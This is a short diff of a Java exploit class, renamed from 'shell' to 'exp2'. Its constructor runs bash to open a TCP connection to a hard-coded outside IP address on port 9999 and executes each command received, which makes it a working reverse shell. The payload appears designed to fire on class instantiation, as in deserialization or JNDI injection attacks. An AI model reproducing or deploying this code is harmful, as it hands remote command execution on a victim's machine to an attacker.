@@ -2,8 +2,8 @@ import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 
-public class shell{
-    public shell() throws Exception {
+public class exp2{
+    public exp2() throws Exception {
         Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/34.64.50.165/9999;cat <&5 | while read line; do $line 2>&5 >&5; done"});
         InputStream is = p.getInputStream();
         BufferedReader reader = new BufferedReader(new InputStreamReader(is));
